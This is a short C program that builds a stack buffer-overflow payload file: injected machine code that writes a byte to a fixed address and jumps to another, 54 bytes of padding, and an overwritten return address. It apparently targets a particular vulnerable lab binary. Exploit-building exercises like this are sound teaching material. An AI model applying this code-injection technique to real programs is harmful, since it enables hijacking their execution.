#include<stdio.h>

int main(){
    FILE *file = fopen("payload9", "w");

    char shellcode[14] = {0xc6, 0x04, 0x25, 0x34, 0x40, 0x40, 0x00, 0x39, 0x68, 0x2a, 0x12, 0x40, 0x00, 0xc3};
    char padding[54];
    char addr[4] = {0x60, 0x40, 0x40, 0x00};

    if(file == NULL){
        perror("Failed to open file.\n");
        return 1;
    }

    /* Filling padding */
    for(int i = 0; i < 54; i++){
        padding[i] = 0x41;
    }

    fwrite(shellcode, sizeof(shellcode), 1, file);
    fwrite(padding, sizeof(padding), 1, file);
    fwrite(addr, sizeof(addr), 1, file);

    fclose(file);

    return 0;
}